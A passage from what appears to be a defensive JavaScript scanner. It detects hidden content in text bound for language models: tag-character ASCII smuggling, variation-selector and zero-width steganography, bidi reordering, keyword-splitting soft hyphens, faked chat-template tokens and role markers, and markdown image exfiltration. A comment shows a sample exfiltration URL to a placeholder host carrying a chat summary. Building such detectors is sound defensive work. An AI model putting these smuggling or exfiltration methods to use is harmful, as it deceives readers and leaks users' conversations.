        if (k < j && spec.length >= 3 && spec.length <= 7 && spec.every((c) => (c >= 0xE0030 && c <= 0xE0039) || (c >= 0xE0061 && c <= 0xE007A))) {
          allowed.subdivisionFlags++;
          const code = String.fromCharCode(...spec.map((c) => c - 0xE0000));
          if (!RGI_SUBDIVISIONS.has(code)) nonRgiFlags.push({ at: i - 1, from: i, to: k + 1, code });
          start = k + 1;
        }
      }
      if (start < j) {
        const run = cps.slice(start, j);
        let decoded = '', printable = 0;
        for (const c of run) { const a = c - 0xE0000; if (a >= 0x20 && a <= 0x7E) { decoded += String.fromCharCode(a); printable++; } else if (a !== 0x01 && a !== 0x7F) decoded += '?'; }
        hidden.tags += decoded;
        add({ severity: printable ? 'critical' : 'warning', category: 'tag_chars', code: printable ? 'tag_payload' : 'tag_chars', count: run.length, index: start, positions: [start],
          codepoints: [...new Set(run)].slice(0, 5).map(hex), ...(printable ? { decoded: clip(decoded, MAX_PAYLOAD_CHARS) } : {}), excerpt: lazy(() => excerpt(start, Math.min(run.length, 3))),
          message: printable ? `${run.length} invisible Unicode tag characters (U+E0000–U+E007F) carrying hidden ASCII text ("ASCII smuggling"). Models read it; people cannot see it.` : `${run.length} Unicode tag character(s) outside a flag emoji sequence.`,
          fix: 'Strip U+E0000–U+E007F (keep only well-formed subdivision flag sequences) before the text reaches a model, log or database.' });
        for (let x = start; x < j; x++) remove[x] = 1;
      }
      i = j - 1; continue;
    }

    // Variation selectors (emoji / ideographic variants are fine; runs are a covert byte channel).
    if (isVS(cp)) {
      let j = i; while (j < n && isVS(cps[j])) j++;
      const len = j - i; const base = cps[i - 1]; const baseCh = base === undefined ? '' : String.fromCodePoint(base);
      if (len === 1) {
        if ((cp === 0xFE0F || cp === 0xFE0E) && base !== undefined && RE.EMOJI.test(baseCh)) allowed.emojiVariationSelectors++;
        else if (cp >= 0xE0100 && base !== undefined && RE.HAN.test(baseCh)) allowed.ideographicVariations++;
        else if (cp >= 0xE0100) { bump('ivs', i, () => ({ severity: 'warning', category: 'variation_selectors', code: 'ivs_unusual', codepoints: [hex(cp)], message: 'Ideographic variation selector (U+E0100–U+E01EF) after a character that is not a Han ideograph. It has no visible effect here.', fix: 'Remove variation selectors that do not follow a CJK ideograph.' })); remove[i] = 1; }
        else { if (cp <= 0xFE0D) vsSpread++; bump('vs1', i, () => ({ severity: 'info', category: 'variation_selectors', code: 'vs_unusual', codepoints: [hex(cp)], message: 'A single variation selector after a character that is not an emoji. Some standardized variants use this; usually harmless.', fix: 'Remove it if the text is not meant to carry glyph variants.' })); }
      } else {
        const d = decodeVS(cps.slice(i, j));
        if (d.text) hidden.variationSelectors += d.text;
        const strong = (d.text && d.text.length >= 2) || len >= 8;
        add({ severity: strong ? 'critical' : 'warning', category: 'variation_selectors', code: 'vs_stego', count: len, index: i, positions: [i], codepoints: [...new Set(cps.slice(i, j))].slice(0, 5).map(hex),
          ...(d.text ? { decoded: clip(d.text, MAX_PAYLOAD_CHARS) } : { decodedHex: d.hex }), excerpt: lazy(((at) => () => excerpt(at - 1, 2))(i)),
          message: `${len} variation selectors in a row after ${base === undefined ? 'the start of the text' : reveal(baseCh, 4)}. Only one can have an effect; a run like this hides ${d.bytes} bytes of data ("emoji smuggling")${d.text ? ' that decode to text' : ''}.`,
          fix: 'Keep at most one variation selector after an emoji or ideograph and strip the rest (U+FE00–U+FE0F, U+E0100–U+E01EF).' });
        for (let x = i; x < j; x++) remove[x] = 1;
      }
      i = j - 1; continue;
    }

    // Bidi controls are reported by the per-line pass below; here they only feed the cleaner.
    if (isBidiCtl(cp)) { remove[i] = 1; continue; }

    // Zero-width / invisible stego runs.
    if (ZW_STEGO.has(cp)) {
      let j = i; while (j < n && ZW_STEGO.has(cps[j])) j++;
      if (j - i >= 8) {
        const run = cps.slice(i, j); const d = decodeZeroWidth(run);
        if (d) hidden.zeroWidth += d.text;
        stegoRuns++;
        add({ severity: 'critical', category: 'zero_width', code: 'zero_width_stego', count: run.length, index: i, positions: [i], codepoints: [...new Set(run)].slice(0, 5).map(hex),
          ...(d ? { decoded: clip(d.text, MAX_PAYLOAD_CHARS), scheme: d.scheme } : {}), excerpt: lazy(((at) => () => excerpt(at - 1, 2))(i)),
          message: `${run.length} invisible zero-width characters in a row: a pattern used to hide data or watermark text${d ? ' (decoded with a common binary scheme)' : ''}.`,
          fix: 'Strip zero-width characters (U+200B–U+200F, U+2060–U+2064, U+FEFF, U+180E, U+034F) before using the text.' });
        for (let x = i; x < j; x++) remove[x] = 1;
        i = j - 1; continue;
      }
      if (isBidiMark(cp)) continue; // handled by the bidi pass
      if (!ZW.has(cp)) { // short runs of invisible math operators / CGJ
        bump(`inv:${cp}`, i, () => ({ severity: 'warning', category: 'invisible', code: 'invisible_char', codepoints: [hex(cp)], message: `Invisible character ${label(cp)}.`, fix: 'Remove invisible formatting characters unless the text is mathematical notation that needs them.' }));
        zwFlagged.push(cp); remove[i] = 1; continue;
      }
      let p = i - 1; while (p >= 0 && ZW.has(cps[p])) p--;
      let q = i + 1; while (q < n && ZW.has(cps[q])) q++;
      const prev = cps[p], next = cps[q];
      if (cp === 0x200D && emojiish(cps[i - 1]) && extPict(cps[i + 1])) { allowed.zwjEmojiSequences++; continue; }
      if ((cp === 0x200D || cp === 0x200C) && (joinScript(prev) || joinScript(next))) { allowed.scriptJoiners++; continue; }
      if (cp === 0x180E && (RE.MONGOLIAN.test(String.fromCodePoint(prev ?? 32)) || RE.MONGOLIAN.test(String.fromCodePoint(next ?? 32)))) { allowed.scriptJoiners++; continue; }
      if (cp === 0xFEFF && i === 0) {
        add({ severity: 'info', category: 'zero_width', code: 'leading_bom', count: 1, index: 0, positions: [0], codepoints: ['U+FEFF'], message: 'Byte order mark at the start of the text. Common in files saved on Windows; harmless but invisible.', fix: 'Strip a leading U+FEFF when reading the text.' });
        remove[i] = 1; continue;
      }
      const split = letterish(prev) && letterish(next);
      bump(`zw:${cp}:${split}`, i, () => ({ severity: 'warning', category: 'zero_width', code: split ? 'zero_width_split' : 'zero_width', codepoints: [hex(cp)],
        message: split ? `${label(cp)} inside a word. It splits the word for keyword filters and tokenizers while looking unchanged (e.g. "ig⟦U+200B⟧nore").` : `Invisible ${label(cp)}.`,
        fix: 'Remove zero-width characters except a ZWJ inside emoji sequences or ZWJ/ZWNJ in scripts that need them (Arabic, Persian, Indic).' }));
      zwFlagged.push(cp); remove[i] = 1; continue;
    }

    if (HANGUL_FILLER.has(cp)) {
      bump(`hf:${cp}`, i, () => ({ severity: 'warning', category: 'invisible', code: 'hangul_filler', codepoints: [hex(cp)], message: `${label(cp)}: renders as blank space but counts as a letter, so it is used for invisible identifiers and usernames.`, fix: 'Remove Hangul filler characters outside genuine Hangul jamo text.' }));
      remove[i] = 1; continue;
    }
    if (cp === 0x2800) { bump('braille', i, () => ({ severity: 'info', category: 'invisible', code: 'blank_lookalike', codepoints: ['U+2800'], message: 'U+2800 BRAILLE PATTERN BLANK looks like a space but is not whitespace; used to fake empty names or messages.', fix: 'Replace with a normal space or remove.' })); continue; }
    if (cp >= 0x80 && cp <= 0x9F) { bump(`c1:${cp}`, i, () => ({ severity: 'warning', category: 'control_chars', code: 'control_char', codepoints: [hex(cp)], message: `C1 control character ${hex(cp)}.`, fix: 'Remove C1 control characters.' })); remove[i] = 1; continue; }
    if (cp >= 0xD800 && cp <= 0xDFFF) { bump('surrogate', i, () => ({ severity: 'warning', category: 'other', code: 'lone_surrogate', codepoints: [hex(cp)], message: 'Unpaired UTF-16 surrogate: not valid Unicode text. Different systems handle it differently, which can bypass filters.', fix: 'Reject or replace lone surrogates with U+FFFD.' })); remove[i] = 1; continue; }
    if (cp === 0x2028 || cp === 0x2029) { bump(`ls:${cp}`, i, () => ({ severity: 'info', category: 'other', code: 'line_separator', codepoints: [hex(cp)], message: `${label(cp)}: an invisible line break that some parsers (and older JavaScript) treat differently from \\n.`, fix: 'Replace with a normal line feed.' })); continue; }
    if (isPUA(cp)) { bump('pua', i, () => ({ severity: 'info', category: 'other', code: 'private_use', codepoints: [hex(cp)], message: 'Private-use code point: no standard meaning or glyph; can carry data or render as an icon font glyph.', fix: 'Remove unless you use a private-use icon font.' })); continue; }
    if (isNonchar(cp)) { bump('nonchar', i, () => ({ severity: 'info', category: 'other', code: 'noncharacter', codepoints: [hex(cp)], message: 'Unicode noncharacter: should not appear in interchanged text.', fix: 'Remove noncharacters.' })); remove[i] = 1; continue; }
    if (cp > 0x7F && cp < 0xE0000 && !isBidiMark(cp) && isDI(cp)) {
      if (cp === 0x00AD && shyChecks++ < 200) { // soft hyphen splitting an instruction keyword ("ig\u00ADnore")
        let a = i - 1, b = i + 1, w = '';
        while (a >= 0 && i - a <= 24 && (cps[a] === 0xAD || letterish(cps[a]))) a--;
        while (b < n && b - i <= 24 && (cps[b] === 0xAD || letterish(cps[b]))) b++;
        for (let x = a + 1; x < b; x++) if (cps[x] !== 0xAD) w += String.fromCodePoint(cps[x]);
        if (SPLIT_KEYWORDS.has(w.toLowerCase())) {
          bump(`shy-kw:${w.toLowerCase()}`, i, () => ({ severity: 'warning', category: 'invisible', code: 'soft_hyphen_split', word: reveal(w, 40), codepoints: ['U+00AD'], message: `Soft hyphen (invisible unless the line breaks there) inside the instruction keyword "${clip(w, 40)}": a known way to slip keywords past filters.`, fix: 'Remove soft hyphens before keyword matching or sending the text to a model.' }));
          remove[i] = 1; continue;
        }
      }
      if (MONGOLIAN_FVS.has(cp) && RE.MONGOLIAN.test(String.fromCodePoint(cps[i - 1] ?? 32))) { allowed.scriptJoiners++; continue; }
      bump(`di:${cp}`, i, () => ({ severity: cp === 0x00AD ? 'info' : 'warning', category: 'invisible', code: cp === 0x00AD ? 'soft_hyphen' : 'invisible_char', codepoints: [hex(cp)], message: `Invisible default-ignorable character ${label(cp)}.`, fix: 'Remove invisible characters before keyword matching or sending the text to a model.' }));
      if (cp !== 0x00AD) zwFlagged.push(cp);
      remove[i] = 1; continue;
    }
    if (cp > 0xE007F && cp <= 0xE0FFF) { bump('di-high', i, () => ({ severity: 'warning', category: 'invisible', code: 'invisible_char', codepoints: [hex(cp)], message: `Unassigned default-ignorable code point ${hex(cp)}: invisible everywhere.`, fix: 'Remove it.' })); remove[i] = 1; continue; }
    if (cnAt !== null && cnAt.has(i)) { bump('unassigned', i, () => ({ severity: 'info', category: 'other', code: 'unassigned', codepoints: [hex(cp)], message: 'Code point not assigned in this Unicode version: renders as a box or nothing.', fix: 'Remove unassigned code points.' })); }
  }

  // Spread single variation selectors (VS1–VS14 after ordinary letters): one alone is a standardized variant, many are a channel.
  if (vsSpread >= 4) {
    const f = agg.get('vs1');
    if (f) Object.assign(f, { severity: 'warning', code: 'vs_spread', message: `${vsSpread} variation selectors (U+FE00–U+FE0D) after ordinary characters. They have no visible effect there; spread through the text they can carry hidden data.`, fix: 'Strip variation selectors that do not follow an emoji or a character with a standardized variant.' });
    for (let x = 0; x < n; x++) if (cps[x] >= 0xFE00 && cps[x] <= 0xFE0D && !(x > 0 && RE.EMOJI.test(String.fromCodePoint(cps[x - 1])))) remove[x] = 1;
  }

  // Non-RGI subdivision flags. One ISO 3166-2 shaped flag (2 letters + 1–3 alphanumerics, e.g. "ustx") is info.
  // A spec that is not region-shaped ("ignore"), or a chain of 2+ non-RGI flags, is tag text in disguise: models read the letters.
  if (nonRgiFlags.length) {
    const isoShaped = (c) => /^[a-z]{2}[a-z0-9]{1,3}$/.test(c);
    const smuggled = nonRgiFlags.length >= 2 || nonRgiFlags.some((f) => !isoShaped(f.code));
    if (!smuggled) {
      for (const f of nonRgiFlags) bump(`flag:${f.code}`, f.at, () => ({ severity: 'info', category: 'tag_chars', code: 'non_rgi_flag', decoded: f.code, message: `Subdivision flag tag sequence "${f.code}" is well-formed but not one of the recommended (RGI) flags; most platforms show a plain black flag.`, fix: 'Usually harmless. Remove it if you do not expect flags here.' }));
    } else {
      const decoded = nonRgiFlags.map((f) => f.code).join('');
      hidden.tags += decoded;
      for (const f of nonRgiFlags) for (let x = f.from; x < f.to; x++) remove[x] = 1;
      const first = nonRgiFlags[0].at;
      add({ severity: nonRgiFlags.length >= 2 ? 'critical' : 'warning', category: 'tag_chars', code: 'flag_tag_smuggling', count: nonRgiFlags.length, index: first, positions: nonRgiFlags.slice(0, MAX_POSITIONS).map((f) => f.at),
        decoded: clip(decoded, MAX_PAYLOAD_CHARS), specs: nonRgiFlags.slice(0, 20).map((f) => f.code), excerpt: lazy(() => excerpt(first, 8)),
        message: `${nonRgiFlags.length} black-flag tag sequence(s) that are not real subdivision flags${nonRgiFlags.some((f) => !isoShaped(f.code)) ? ' (not region-code shaped)' : ''}. Each carries invisible tag letters that models read: together they spell "${clip(decoded, 60)}".`,
        fix: 'Keep only the RGI subdivision flags (England, Scotland, Wales) and strip other U+1F3F4 + tag sequences.' });
    }
  }

  // Zero-width bits spread across the text (one hidden character between visible letters).
  if (!stegoRuns && zwFlagged.length >= 16) {
    const d = decodeZeroWidth(zwFlagged);
    if (d) {
      hidden.zeroWidth += d.text;
      add({ severity: 'critical', category: 'zero_width', code: 'zero_width_stego', count: zwFlagged.length, index: agg.get([...agg.keys()].find((k) => k.startsWith('zw:')))?.index ?? 0, positions: [], codepoints: [...new Set(zwFlagged)].slice(0, 5).map(hex), decoded: clip(d.text, MAX_PAYLOAD_CHARS), scheme: `${d.scheme} (spread across the text)`, message: `${zwFlagged.length} zero-width characters spread through the text decode to hidden text.`, fix: 'Strip zero-width characters before using the text.' });
    }
  }

  if (BIDI_ANY.test(text)) bidiPass(text, cps, c2u, u2c, chars, hasRTL, add, bump, excerpt, allowed, remove, full, tally);
  tokenPass(text, u2c, add, bump, remove, cps);
  markdownPass(text, u2c, add);
  confusablePass(text, u2c, add);

  // ---------- assemble ----------
  const sevOrder = { critical: 0, warning: 1, info: 2 };
  findings.sort((a, b) => sevOrder[a.severity] - sevOrder[b.severity] || a.index - b.index);
  const counts = { critical: 0, warning: 0, info: 0 }; const byCat = Object.fromEntries(CATEGORIES.map((c) => [c, 0]));
  for (const f of findings) { counts[f.severity]++; byCat[f.category] = (byCat[f.category] || 0) + 1; if (f.positions && !f.positions.length) delete f.positions; }
  const dropped = overflow.critical + overflow.warning + overflow.info;
  for (const sev of ['critical', 'warning', 'info']) counts[sev] += overflow[sev];
  for (const [c, v] of Object.entries(overflow.byCat)) byCat[c] = (byCat[c] || 0) + v;
  const verdict = counts.critical ? 'dangerous' : counts.warning ? 'suspicious' : 'clean';
  const riskScore = Math.min(100, counts.critical * SEV_WEIGHT.critical + counts.warning * SEV_WEIGHT.warning + counts.info * SEV_WEIGHT.info);
  const shown = findings.slice(0, MAX_FINDINGS).map(resolve);
  const hiddenOut = {};
  if (hidden.tags) hiddenOut.tagCharacters = clip(hidden.tags, MAX_HIDDEN_CHARS);
  if (hidden.variationSelectors) hiddenOut.variationSelectors = clip(hidden.variationSelectors, MAX_HIDDEN_CHARS);
  if (hidden.zeroWidth) hiddenOut.zeroWidth = clip(hidden.zeroWidth, MAX_HIDDEN_CHARS);
  const body = {
    verdict, riskScore,
    summary: { critical: counts.critical, warning: counts.warning, info: counts.info, codePoints: n, bytes, lines: text.split('\n').length, categories: byCat, verdictMeaning: VERDICT_MEANING[verdict] },
    hidden: hiddenOut,
    allowed,
    findings: shown,
    ...(findings.length + dropped > shown.length ? { findingsOmitted: findings.length + dropped - shown.length } : {}),
    meta: { version: VERSION, stored: false, networkLookups: false, unicodeConfusables: CONFUSABLES_VERSION, positions: 'code point offsets, 0-based', untrusted: 'decoded, excerpt and word fields contain text from your input; invisible characters in them are shown as ⟦U+XXXX⟧' },
  };
  if (opts.includeCleaned) {
    let cleaned = ''; let removed = 0;
    const cs = chars(); for (let i = 0; i < n; i++) { if (remove[i]) removed++; else cleaned += cs[i]; }
    body.cleaned = cleaned; body.removedCodePoints = removed;
  }
  return body;
}

function bidiPass(text, cps, c2u, u2c, chars, hasRTLscript, add, bump, excerpt, allowed, remove, full, tally) {
  const n = cps.length;
  // U+061C ARABIC LETTER MARK has Script=Arabic but is not a letter: it must not make English text count as RTL.
  const hasRTL = hasRTLscript && RTL_LETTER.test(text);
  let lineStart = 0; let stack = []; let ctlInLine = []; let lineRTL = false; let overflowDepth = false;
  const MAX_DEPTH = 125; // UBA max_depth: deeper nesting is ignored by renderers; treat it as unterminated (critical)
  const flushLine = (end) => {
    if (ctlInLine.length) lineRTL = RTL_LETTER.test(text.slice(c2u[lineStart], c2u[end]));
    if (ctlInLine.length && full()) { // findings list is full: tally only (exact counts, no object building)
      const overrides = ctlInLine.some((x) => x.cp === 0x202D || x.cp === 0x202E);
      const rtlOpeners = !lineRTL && ctlInLine.some((x) => x.cp === 0x202B || x.cp === 0x2067);
      tally(overrides || stack.length > 0 || overflowDepth || rtlOpeners ? 'critical' : 'warning', 'bidi');
    } else if (ctlInLine.length) {
      const ls = lineStart;
      const overrides = ctlInLine.filter((x) => x.cp === 0x202D || x.cp === 0x202E);
      const unterminated = stack.length > 0 || overflowDepth;
      // RLE / RLI flip LTR text to RTL: only meaningful (and dangerous) in a line with no RTL letters.
      const rtlOpeners = !lineRTL && ctlInLine.some((x) => x.cp === 0x202B || x.cp === 0x2067);
      // Balanced LRE/LRI/FSI…PDF/PDI without overrides is what i18n libraries emit (Fluent/ICU FSI…PDI around
      // placeables, Android BidiFormatter LRE…PDF): warning, not critical. Same for balanced controls in RTL lines.
      const severity = overrides.length || unterminated || rtlOpeners ? 'critical' : 'warning';
      const code = unterminated ? 'bidi_unterminated' : overrides.length ? 'bidi_override' : 'bidi_control';
      const first = ctlInLine[0].i;
      add({ severity, category: 'bidi', code, count: ctlInLine.length, index: first, positions: ctlInLine.slice(0, 10).map((x) => x.i), codepoints: [...new Set(ctlInLine.map((x) => x.cp))].map(hex),
        excerpt: lazy(() => reveal(chars().slice(ls, Math.min(end, ls + 160)).join(''), 160)),
        message: `${ctlInLine.length} bidirectional control character(s) in one line${overrides.length ? ', including an override (U+202D/U+202E) that reverses how the text is displayed' : ''}${unterminated ? '; at least one is never closed before the line ends' : ''}${rtlOpeners ? '; a right-to-left embedding/isolate in a line with no right-to-left text' : ''}${severity === 'warning' ? '. They are balanced, as localisation libraries emit them, but still make stored and displayed order differ' : '. Text can display in a different order than it is stored and read by tools ("Trojan Source")'}.`,
        fix: 'Remove U+202A–U+202E and U+2066–U+2069, or require them to be balanced and only in right-to-left text.' });
    }
    stack = []; ctlInLine = []; lineRTL = false; overflowDepth = false;
  };
  BIDI_SCAN.lastIndex = 0;
  for (;;) {
    // Jump straight to the next line break, bidi control or directional mark (one native regex search per stop).
    const m = BIDI_SCAN.exec(text); if (!m) break;
    const i = u2c[m.index]; const cp = cps[i];
    if (isParaSep(cp)) { flushLine(i); lineStart = i + 1; continue; }
    if (isBidiCtl(cp)) {
      ctlInLine.push({ i, cp });
      if (cp === 0x202C) { const k = stack.lastIndexOf('e'); if (k >= 0) stack.splice(k, 1); }
      else if (cp === 0x2069) { const k = stack.lastIndexOf('i'); if (k >= 0) stack.splice(k); }
      else if (stack.length < MAX_DEPTH) stack.push(cp >= 0x2066 ? 'i' : 'e'); else overflowDepth = true;
      continue;
    }
    if (isBidiMark(cp)) {
      if (hasRTL) { allowed.rtlMarks++; continue; }
      bump(`bm:${cp}`, i, () => ({ severity: 'warning', category: 'bidi', code: 'bidi_mark', codepoints: [hex(cp)], message: `${label(cp)} in text with no right-to-left script. It is invisible and has no legitimate use here.`, fix: 'Remove directional marks from left-to-right text.' }));
      remove[i] = 1;
    }
  }
  flushLine(n);
}

function tokenPass(text, u2c, add, bump, remove, cps) {
  const fold = foldForMatching(text);
  for (const t of SPECIAL_TOKENS) {
    let raw = 0; let f = null;
    for (const m of text.matchAll(t.re)) {
      raw++;
      const idx = u2c[m.index];
      if (!f) f = add({ severity: t.severity, category: 'special_tokens', code: 'special_token', token: t.token, family: t.family, count: 0, index: idx, positions: [], excerpt: lazy(() => reveal(text.slice(Math.max(0, m.index - 30), m.index + m[0].length + 30), 120)),
        message: `${t.family} chat-template token ${t.token}. Inside untrusted text it can fake a system / user / assistant turn when the text is pasted into a prompt.`,
        fix: 'Escape or strip chat-template tokens from untrusted input (and never let a tokenizer parse them as special tokens).' });
      f.count++; if (f.positions.length < MAX_POSITIONS) f.positions.push(idx);
      if (raw >= 1000) break;
    }
    let folded = 0; for (const _ of fold.matchAll(t.re)) { folded++; if (folded > raw || folded >= 1000) break; }
    if (folded > raw) add({ severity: 'critical', category: 'special_tokens', code: 'special_token_obfuscated', token: t.token, family: t.family, count: folded - raw, index: 0,
      message: `${t.family} token ${t.token} hidden with invisible or look-alike (full-width / compatibility) characters. After normalization it becomes a real chat-template token; this is a filter-evasion pattern.`,
      fix: 'Normalize (NFKC, strip invisible characters) before filtering, then strip chat-template tokens.' });
  }
  let generic = null;
  for (const m of text.matchAll(GENERIC_SPECIAL)) {
    if (KNOWN_SPECIAL.has(m[0]) || /^<\|reserved_special_token_\d+\|>$/.test(m[0])) continue;
    const idx = u2c[m.index];
    if (!generic) generic = add({ severity: 'warning', category: 'special_tokens', code: 'special_token_like', count: 0, index: idx, positions: [], token: clip(m[0], 60), excerpt: lazy(() => reveal(text.slice(Math.max(0, m.index - 30), m.index + m[0].length + 30), 120)), message: 'Text shaped like a model special token (<|name|>). Many chat templates use this form for control tokens.', fix: 'Escape <| and |> in untrusted input.' });
    generic.count++; if (generic.positions.length < MAX_POSITIONS) generic.positions.push(idx);
  }
  let role = null;
  for (const m of text.matchAll(ROLE_MARKER)) {
    const idx = u2c[m.index + 2];
    if (!role) role = add({ severity: 'warning', category: 'special_tokens', code: 'role_marker', count: 0, index: idx, positions: [], excerpt: lazy(() => reveal(text.slice(m.index, m.index + 60), 80)), message: 'A "Human:" / "Assistant:" turn marker after a blank line: an old completion-prompt format that can fake a conversation turn.', fix: 'Quote or escape transcript-style turn markers in untrusted input.' });
    role.count++; if (role.positions.length < MAX_POSITIONS) role.positions.push(idx);
  }
  void bump; void remove; void cps;
}
/** NFKC + drop invisible / tag / VS / bidi characters: what a careless normalizer or tokenizer would "see". */
export function foldForMatching(text) {
  if (!/[^\x00-\x7F]/.test(text)) return text; // ASCII: NFKC is the identity
  return text.replace(DI_G, '').normalize('NFKC'); // tags, VS, bidi controls and zero-width are all Default_Ignorable
}
const DI_G = /\p{Default_Ignorable_Code_Point}/gu;

/** Stop condition shared by every forward scan: newline, or the start of another candidate ("![" or "](").  */
const atBoundary = (text, j) => { const c = text.charCodeAt(j); return c === 10 || (c === 33 && text.charCodeAt(j + 1) === 91) || (c === 93 && text.charCodeAt(j + 1) === 40); };
/** Parse an inline destination starting right after "(". Returns { url, end, loose } or null. Bounded: O(URL_MAX + TITLE_MAX + SPACED_BODY_MAX). */
function parseDest(text, p) {
  const n = text.length; let j = p; let w = 0;
  while (j < n && (text.charCodeAt(j) === 32 || text.charCodeAt(j) === 9) && w < 16) { j++; w++; }
  const us = j; let url;
  if (text.charCodeAt(j) === 60) { // <...>
    let k = j + 1; while (k < n && k - j <= URL_MAX && text.charCodeAt(k) !== 62 && text.charCodeAt(k) !== 60 && !atBoundary(text, k)) k++;
    if (text.charCodeAt(k) !== 62) return null;
    url = text.slice(j + 1, k); j = k + 1;
  } else {
    while (j < n && j - us < URL_MAX && urlChar(text.charCodeAt(j))) j++;
    url = text.slice(us, j);
  }
  if (!url) return null;
  let k = j; w = 0; while (k < n && (text.charCodeAt(k) === 32 || text.charCodeAt(k) === 9) && w < 16) { k++; w++; }
  const c = text.charCodeAt(k);
  if (c === 41) return { url, end: k + 1, loose: false };
  if ((c === 34 || c === 39 || c === 40) && k > j) {
    const close = c === 40 ? 41 : c; let t = k + 1;
    while (t < n && t - k < TITLE_MAX && text.charCodeAt(t) !== close && !atBoundary(text, t)) t++;
    if (text.charCodeAt(t) === close) { t++; w = 0; while (t < n && (text.charCodeAt(t) === 32 || text.charCodeAt(t) === 9) && w < 16) { t++; w++; } if (text.charCodeAt(t) === 41) return { url, end: t + 1, loose: false }; }
  }
  // Not valid CommonMark (spaces or brackets inside the destination), but "![x](https://e.x/?q={summary of the chat})"
  // is an instruction for the model to fill in data and produce a working URL, so treat it as a candidate.
  let b = j; while (b < n && b - us < SPACED_BODY_MAX && text.charCodeAt(b) !== 41 && !atBoundary(text, b)) b++;
  if (text.charCodeAt(b) === 41 && b > j) return { url: text.slice(us, b), end: b + 1, loose: true };
  return null;
}

function markdownPass(text, u2c, add) {
  if (!text.includes('![') && !text.includes('](') && !/<img/i.test(text)) return;
  const n = text.length;
  // Reference definitions: one anchored, bounded match per line.
  const defs = new Map();
  if (text.includes(']:')) {
    let ls = 0;
    while (ls <= n && defs.size < 1000) {
      let le = text.indexOf('\n', ls); if (le < 0) le = n;
      let q = ls; while (q < le && q - ls < 3 && text.charCodeAt(q) === 32) q++;
      if (text.charCodeAt(q) === 91) { const m = REF_DEF_LINE.exec(text.slice(ls, Math.min(le, ls + 3 + 1 + LABEL_MAX + 3 + URL_MAX + 16))); if (m) { const key = m[1].toLowerCase().trim(); if (!defs.has(key)) defs.set(key, m[2]); } }
      ls = le + 1;
    }
  }
  const imgs = []; const MAX_IMGS = 400;
  // Markdown images: "![alt](dest)", "![alt][label]", "![alt][]", "![alt]".
  for (let i = text.indexOf('!['); i >= 0 && imgs.length < MAX_IMGS; i = text.indexOf('![', i + 2)) {
    let j = i + 2;
    while (j < n && j - i - 2 < ALT_MAX) { const c = text.charCodeAt(j); if (c === 93 || c === 91 || c === 33 || c === 10) break; j++; }
    if (text.charCodeAt(j) !== 93) continue;
    const alt = text.slice(i + 2, j); const after = text.charCodeAt(j + 1);
    if (after === 40) {
      const d = parseDest(text, j + 2);
      if (d) imgs.push({ idx: i, url: d.url, loose: d.loose, kind: 'markdown image', len: d.end - i });
      continue;
    }
    let label = alt; let end = j + 1;
    if (after === 91) {
      let k = j + 2; while (k < n && k - j - 2 < LABEL_MAX) { const c = text.charCodeAt(k); if (c === 93 || c === 91 || c === 33 || c === 10) break; k++; }
      if (text.charCodeAt(k) === 93) { if (k > j + 2) label = text.slice(j + 2, k); end = k + 1; }
    }
    const ref = label.toLowerCase().trim();
    if (defs.has(ref)) imgs.push({ idx: i, url: defs.get(ref), loose: false, kind: 'markdown reference image', len: end - i });
  }
  // HTML <img ...>: the tag ends at the next ">" or "<" (cached, monotone), capped at TAG_MAX; src read from that slice only.
  if (imgs.length < MAX_IMGS && /<img/i.test(text)) {
    let gt = -1, lt = -1;
    HTML_IMG_START.lastIndex = 0;
    for (const m of text.matchAll(HTML_IMG_START)) {
      if (imgs.length >= MAX_IMGS) break;
      const i = m.index;
      if (gt !== n && gt <= i) { gt = text.indexOf('>', i); if (gt < 0) gt = n; }
      if (lt !== n && lt <= i) { lt = text.indexOf('<', i + 1); if (lt < 0) lt = n; }
      const tag = text.slice(i, Math.min(gt, lt, i + TAG_MAX));
      const s2 = HTML_SRC.exec(tag);
      if (s2) imgs.push({ idx: i, url: s2[1], loose: false, kind: 'HTML <img>', len: tag.length + 1 });
    }
  }
  imgs.sort((a, b) => a.idx - b.idx);
  // analyzeUrl once per distinct (url, loose): one reference definition can back up to 200 reference images.
  let plain = null; let done = 0; const memo = new Map();
  for (const im of imgs) {
    if (++done > 200) break;
    const mk = (im.loose ? 'L' : 'S') + im.url; let a = memo.get(mk); if (a === undefined) { a = analyzeUrl(im.url, im.loose); memo.set(mk, a); }
    if (!a || a.kind !== 'remote') continue;
    const idx = u2c[im.idx]; const ex = lazy(() => reveal(text.slice(im.idx, im.idx + Math.min(im.len, 200)), 200));
    if (a.strong || a.reasons.length >= 2) add({ severity: 'critical', category: 'markdown_exfil', code: 'image_exfil', count: 1, index: idx, positions: [idx], host: clip(a.host, 100), url: clip(im.url, 300), reasons: a.reasons.slice(0, 4), excerpt: ex,
      message: `${im.kind} pointing at ${clip(a.host, 100)} with a URL built to carry data (${a.reasons.join('; ')}). When a chat UI renders it, the browser fetches the URL automatically, sending whatever the model filled in to that server.`,
      fix: 'Do not render remote images from model output, or only from an allowlist of hosts; strip query strings from image URLs.' });
    else if (a.hasQuery) add({ severity: a.benignQuery ? 'info' : 'warning', category: 'markdown_exfil', code: 'image_query', count: 1, index: idx, positions: [idx], host: clip(a.host, 100), url: clip(im.url, 300), reasons: a.reasons.slice(0, 4), excerpt: ex,
      message: `${im.kind} with a query string, loaded automatically from ${clip(a.host, 100)}. Query strings are the usual channel for image-based data exfiltration.`,
      fix: 'Render remote images only from trusted hosts, without query strings.' });
    else {
      if (!plain) plain = add({ severity: 'info', category: 'markdown_exfil', code: 'remote_image', count: 0, index: idx, positions: [], hosts: [], message: 'Remote image(s): rendering them reveals the reader\'s IP address and the time of reading to the image host.', fix: 'Proxy or block remote images in rendered model output.' });
      plain.count++; if (plain.positions.length < MAX_POSITIONS) plain.positions.push(idx);
      const h = clip(a.host, 100); if (plain.hosts.length < 10 && !plain.hosts.includes(h)) plain.hosts.push(h);
    }
  }
  if (!text.includes('](')) return;
  // Links "[text](dest)": find each "](", walk back (bounded, stops at the previous bracket) to the "[", skip images.
  let k = 0;
  for (let p = text.indexOf(']('); p >= 0 && k < 500; p = text.indexOf('](', p + 2)) {
    let b = p - 1; while (b >= 0 && p - b <= ALT_MAX) { const c = text.charCodeAt(b); if (c === 91 || c === 93 || c === 10) break; b--; }
    if (b < 0 || text.charCodeAt(b) !== 91 || text.charCodeAt(b - 1) === 33) continue;
    const d = parseDest(text, p + 2); if (!d) continue;
    k++;
    const url = d.url; let dec = url; try { dec = decodeURIComponent(url); } catch { /* keep */ }
    if (!/^(https?:)?\/\//i.test(url) || !PLACEHOLDER.test(dec)) continue;
    const idx = u2c[b]; const st = b; const len = d.end - b;
